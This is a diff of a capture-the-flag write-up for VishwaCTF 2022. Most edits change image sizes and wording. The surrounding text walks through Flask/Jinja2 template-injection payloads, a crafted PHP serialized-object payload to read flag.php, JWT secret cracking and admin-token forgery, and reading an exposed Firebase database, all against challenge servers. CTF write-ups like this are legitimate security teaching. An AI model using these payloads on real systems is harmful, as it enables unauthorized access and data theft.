@@ -11,7 +11,7 @@ description: CTF - VishwaCTF 2022
 # VishwaCTF CTF 2022
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/logo.png" width="50%"/>
+  <img src="/images/writeups/VishwaCTF2022/logo.png" width="40%"/>
 </p>
 
 Welcome! I've participated in this CTF with team [ISwearIGoogledIt](https://ctftime.org/team/109689), specifically with [RazviOverflow](https://razvioverflow.github.io/) and got some challenges! This CTF was begginer friendly and participated for fun. Some guessy work and some challenges that remain unsolved due to the guessy part, but overall got some new techniques, specially for Firebase pentesting.
@@ -130,10 +130,10 @@ https://h3y-buddy.vishwactf.com/submit?name={{7*7}}
 Now that we know it works, let's level up the payloads until we reach the flag. You can get a great reference for SSTI payloads in different template engines on [Hacktricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-read-remote-file). In this case, we used **get_flashed_messages** a built-in function on flask
 
 ```
-https://h3y-buddy.vishwactf.com/submit?name={{request.__class__}}
-https://h3y-buddy.vishwactf.com/submit?name={{request.__class__.__mro__[2]}}
-https://h3y-buddy.vishwactf.com/submit?name={{request.__class__.__mro__[2].__subclasses__()}}
-https://h3y-buddy.vishwactf.com/submit?name={{get_flashed_messages.__globals__.__builtins__}}
+https://h3y-buddy.vishwactf.com/submit?name=\{\{request.__class__\}\}
+https://h3y-buddy.vishwactf.com/submit?name=\{\{request.__class__.__mro__[2]\}\}
+https://h3y-buddy.vishwactf.com/submit?name=\{\{request.__class__.__mro__[2].__subclasses__()\}\}
+https://h3y-buddy.vishwactf.com/submit?name=\{\{get_flashed_messages.__globals__.__builtins__\}\}
 ```
 
 ```json
@@ -165,6 +165,7 @@ https://h3y-buddy.vishwactf.com/submit?name={{get_flashed_messages.__globals__._
 
 ``` VishwaCTF{S3rv3r_1s_4fraiD_of_inj3c7ion} ```
 
+---
 
 ## Stock Bot
 470
@@ -246,7 +247,7 @@ Decode it from base64...
 ?>
 ```
 
-So the input that we need is Flag:
+So, as seen in the source code, the input that we need is Flag:
 url: /Products/check.php?product=Flag
 
 ```json
@@ -275,7 +276,7 @@ We have the following website:
 With that challenge description we might wan't to call other request method called FLAG(?) maybe... So instead of GET/POST use FLAG method:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Web/4_1_flag.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Web/4_1_flag.png" width="80%"/>
 </p>
 
 ``` VishwaCTF{404_1s_ju57_4n_i11u5ion} ```
@@ -348,8 +349,7 @@ URL decode
 952a7d7c0da6c6a43087fa4e7ddd256efad8c1d7a:2:{i:0;s:4:"flag";i:1;s:4:"flag";}
 
 SHA1: 952a7d7c0da6c6a43087fa4e7ddd256efad8c1d7
-Serialized object: a:2:{i:0;s:4:"flag";i:1;s:4:"flag";} These are the parts:
-
+Serialized object: a:2:{i:0;s:4:"flag";i:1;s:4:"flag";}
 ```
 
 What is the meaning of the serialized object? Let's decompose it:
@@ -370,7 +370,8 @@ a:2:{i:0;s:4:"flag";i:1;s:4:"flag";}
 ```
 
 Great, we have seen how an array is serialized in PHP and the meaning of the different parts. How can we take advantage from these?
-We can also serialize objects, data structures, types and classes. How can we access the _/flag.php_ file (we know from the hint in the src code)?
+We can also serialize objects, data structures, types and classes. 
+How can we access the _/flag.php_ file (we know from the hint in the src code)?
 We obtained the code of this file with the __Class ShowSource__ as we saw in the source code, so applying it to the _/flag.php_ might be feasible. Let's see what we need and the corresponding payload.
 
 1. We need to call the **__toString()** method from the ShowSource class, so we need to echo it or print it in the HTML. We can do it by inserting it in the TODO list array.
@@ -379,7 +380,7 @@ We obtained the code of this file with the __Class ShowSource__ as we saw in the
 a:1:{something}
 ```
 
-We need to instanciate an object of class ShowSource with the source attribute "flag.php". We can achieve it with the following payload: 
+2. We need to instanciate an object of class ShowSource with the source attribute "flag.php". We can achieve it with the following payload: 
 
 ```js
 O:16:"ShowSource":1:{s:6:"source";s:8:"flag.php";}
@@ -387,7 +388,7 @@ O:16:"ShowSource":1:{s:6:"source";s:8:"flag.php";}
 
 (If you are not confident with the payload crafting, you can always write your payload in PHP, serialize it and print it)
 
-So the final payload is this:
+3. So the final payload is this:
 
 ```js
 a:1:{i:0;O:16:"ShowSource":1:{s:6:"source";s:8:"flag.php";}}
@@ -409,7 +410,7 @@ $h = sha1($m);
 echo urlencode($h.$m);
 ```
 
-Final payload:
+Final payload obtained from the execution of the aforementioned PHP code:
 
 ```
 db2a103dd4cc5d8271a28152d8f3de49379d9ad8a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22ShowSource%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D 
@@ -431,13 +432,13 @@ Yet another API for ‘user’ signup and login. You know the drill, GO! https:/
 We have the following website listing the different API methods:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Web/6_0_web.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Web/6_0_web.png" width="60%"/>
 </p>
 
 Calling the singup we obtain a JWT token:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Web/6_11_req.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Web/6_11_req.png" width="80%"/>
 </p>
 
 ```
@@ -447,7 +448,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imthc2htaXI1NCIsInJvbGUiOiJ
 And using it on the user endpoint we see the unauthorized message:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Web/6_2_invalid_admin.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Web/6_2_invalid_admin.png" width="80%"/>
 </p>
 
 We can check the content using [JWT.io](https://jwt.io/)
@@ -458,9 +459,11 @@ We can check the content using [JWT.io](https://jwt.io/)
 
 The first possibility is to change the **role** from user to admin and probably we might gain access. The problem to this approach is that we need to sign the token with a secret key (the blue/last part of the token). We don't the key, but what if the key is weak and can be guessable? Let's try to crack it using [jwt_tool](https://github.com/ticarpi/jwt_tool) and the **rockyou.txt** wordlist which holds a great set of common passwords:
 
+
 ```sh
 python3 jwt_tool.py -C -d /usr/share/wordlists/rockyou.txt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imthc2htaXI1NCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjQ3ODkwODM5fQ.3f-DyDHTGTGR3ENVQuUKxPV0hRoS2Ix0dSaFQqolqdQ
 ```
+
 
 Soooooooo I didn't get this challenge becase I didn't have the secret on the wordlist. The key was _owasp_. Since I supposed that bruteforcing tasks on CTF are not further than rockyou.txt or some basic hashcat commands I abandoned this task. Once I knew the key, attack is simple:
 
@@ -481,7 +484,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imthc2htaXI1NCIsInJvbGUiOiJ
 Now use the token in the request:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Web/6_5_flag.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Web/6_5_flag.png" width="80%"/>
 </p>
 
 ``` VishwaCTF{w3@k_$ecr3t$} ```
@@ -537,7 +540,7 @@ We have the following source code:
 ?> 
 ```
 
-So more than web this is a reversing challenge. Therefore I reverse it (in Python3, I just hate PHP):
+So more than web this is a reversing challenge. Therefore, I reverse it (in Python3, I just hate PHP):
 
 ```python
 strkey = '576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982'
@@ -648,7 +651,8 @@ const firebaseConfig = {
 }; 
 ```
 
-We can see in it a Firebase 🔥 database configuration with the API key and everything. Having all that, we can use it to see the flags that the application is storing in it. I searched for many tools or URL formats to access these data, and ended up with [baserunner](https://github.com/iosiro/baserunner). If you have issues while building the npm module, use _export NODE_OPTIONS=--openssl-legacy-provider_. Let's wrap up the configuration for this Firebase:
+We can see in it a Firebase 🔥 database configuration with the API key and everything. 
+With all that, we can use it to see the flags that the application is storing in it. I searched for many tools or URL formats to access these data, and ended up with [baserunner](https://github.com/iosiro/baserunner). If you have issues while building the npm module, use _export NODE_OPTIONS=--openssl-legacy-provider_. Let's wrap up the configuration for this Firebase:
 
 
 ```json
@@ -667,13 +671,13 @@ We can see in it a Firebase 🔥 database configuration with the API key and eve
 Set the configuration in the web interface for this module:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Web/7_1_setup.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Web/7_1_setup.png" width="80%"/>
 </p>
 
 In this case, we want to check the collection **flag** which might hold all the flags:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Web/7_2_flag.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Web/7_2_flag.png" width="80%"/>
 </p>
 
 ``` vishwactf{c0nfigur3_y0ur_fir3b@s3_rule$} ```
@@ -684,8 +688,8 @@ Other easier [solution](http://o_o.jseung.me/ctf/2020/vishwactf/#flag-collection
 ```
 https://firestore.googleapis.com/v1/projects/vishwa-challenge-12/databases/(default)/documents/flag
 ```
-
 ---
+<br>
 ---
 
 # Crypto
@@ -761,13 +765,13 @@ My friend sent me file and said how amazing this is, but i think while sending f
 They provide us a corrupted file called _file.extension_. Let's see the header of the file:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Crypto/2_0_xxd.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Crypto/2_0_xxd.png" width="60%"/>
 </p>
 
 That Exif string is a header usually present on JPEG images, so let's fix the first bytes of the image and let's see if that fix the image. I used hexedit and the file header for JPEG (you can find it on [wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)):
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Crypto/2_1_hex.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Crypto/2_1_hex.png" width="60%"/>
 </p>
 
 Fix header with **FF D8 FF DB** 
@@ -784,7 +788,7 @@ Now we have to dig deep. I use binwalk to check if there is something else in th
 binwalk -M --dd=.* file.extension
 ```
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Crypto/2_3_zip.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Crypto/2_3_zip.png" width="80%"/>
 </p>
 
 We can see a zip file, and within, there is a Python3 script called _encrypt.py_ and a _info.txt_ text file:
@@ -848,6 +852,7 @@ And we obtain the flag (in lower case, as stated in the description)
 ``` VishwaCTF{tr1cky_h34d3r_w1th_p3rmu7at10n} ```
 
 ---
+<br>
 ---
 
 
@@ -862,7 +867,7 @@ Once my friend was connected to my network, he did some office work and left. Ne
 On the pcap file in the challenge, we can see a form data in clear text with the password:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Forensic/1_0_password.png" width="70%"/>
+  <img src="/images/writeups/VishwaCTF2022/Forensic/1_0_password.png" width="80%"/>
 </p>
 
 Form item: "pswrd" = "S04xWjZQWFZ5OQ=="
@@ -881,8 +886,10 @@ What it takes do you have?
 We got an image:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Forensic/Y0D4.jpg" width="50%"/>
+  <img src="/images/writeups/VishwaCTF2022/Forensic/Y0D4.jpg" width="40%"/>
 </p>
+
+I used binwalk to check if there is something within, since the image is quite heavy for its size and quality:
 
 ```sh
 binwalk -M --dd=.* Y0D4.jpg         
@@ -926,7 +933,7 @@ python2 /home/kali/Tools/PCRT/PCRT.py -i sail_the_ship.bmp -o fixed.png
 We got a QR:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Forensic/fixed.png" width="40%"/>
+  <img src="/images/writeups/VishwaCTF2022/Forensic/fixed.png" width="30%"/>
 </p>
 
 Reading the QR we obtained the following URL where we can download an image:
@@ -936,7 +943,9 @@ Reading the QR we obtained the following URL where we can download an image:
   <img src="/images/writeups/VishwaCTF2022/Forensic/pirate.jpeg" width="50%"/>
 </p>
 
+```sh
 strings pirate.jpeg
+```
 
 At the end of the file RazviOverflow found this string:
 
@@ -958,13 +967,13 @@ This image goes hard, feel free to run diagnostics.
 We got this image:
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Forensic/patrik.jpg" width="50%"/>
+  <img src="/images/writeups/VishwaCTF2022/Forensic/patrick.jpg" width="60%"/>
 </p>
 
 After trying many different tools like binwalk, exiftool, etc... I went to [Aperisolve](https://aperisolve.fr/40d6244ac8d93e0dcc247946cf0f2185) and check the images. You can also do this locally with [Stegoveritas](https://github.com/bannsec/stegoVeritas):
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Forensic/4_0_aperi.png" width="50%"/>
+  <img src="/images/writeups/VishwaCTF2022/Forensic/4_0_aperi.png" width="70%"/>
 </p>
 
 On the image we found the following string:
@@ -990,14 +999,10 @@ Never gonna give you up Never gonna let you down Never gonna run around and dese
 Then I checked the commits and found an interesting file which was deleted, specifically in this [commit](https://github.com/RohitStark/Epistemus/commit/077d4a0e07aa00c6b7a3d4eebf4b406a3f752a1e#diff-2e6a7d642ac44294bb259197c746b939df76471f3f6ab73119e5791c281054fc):
 
 <p align="center">
-  <img src="/images/writeups/VishwaCTF2022/Forensic/4_0_file.png" width="50%"/>
+  <img src="/images/writeups/VishwaCTF2022/Forensic/4_0_file.png" width="80%"/>
 </p>
 
-I downloaded the zip:
-
-[File](https://github.com/RohitStark/Epistemus/blob/077d4a0e07aa00c6b7a3d4eebf4b406a3f752a1e/something_in_the_way.zip)
-
-Using strings in the zip we got:
+I downloaded the [zip](https://github.com/RohitStark/Epistemus/blob/077d4a0e07aa00c6b7a3d4eebf4b406a3f752a1e/something_in_the_way.zip) from the repo and used strings for the zip. This was the output:
 
 ```
 5   
@@ -1039,7 +1044,7 @@ I used [Sonicvisualizer](https://www.sonicvisualiser.org/) to check what was hap
 
 A pastebin link: [https://pastebin.com/kTX7HTmm](https://pastebin.com/kTX7HTmm)
 
-There we find a Question.txt file with almost 15k lines in this way:
+There, we find a Question.txt file with almost 15k lines in this way:
 
 ```
 D27F92398FD92D384946000101010060
@@ -1069,7 +1074,9 @@ Again Exif header and what it seems to be JFIF at the very beginning, si I tried
 
 This is the encoded flag within the image:
 
+```
 xjslxjKCH{i_hidtqw_npvi_mjajioa}
+```
 
 Seems like a keyed cipher. Could be Vigenere with key "date"? Since it's the only word which is not crossed out.
 It wasn't "date" as key, so I decided to bruteforce Vigenere with the starting part of the flag (viswaCTF) and obtained the following key and flag:
@@ -1078,7 +1085,7 @@ xjslxjKCH{i_hidtqw_npvi_mjajioa}
 
 Key: cbaebjij
 
-[Cyber](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('cbaebjij')&input=eGpzbHhqS0NIe2lfaGlkdHF3X25wdmlfbWphamlvYX0)
+I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('cbaebjij')&input=eGpzbHhqS0NIe2lfaGlkdHF3X25wdmlfbWphamlvYX0) for this task and obtained the following string:
 
 VishwaCTF{h_heckin_love_lasagna}
 
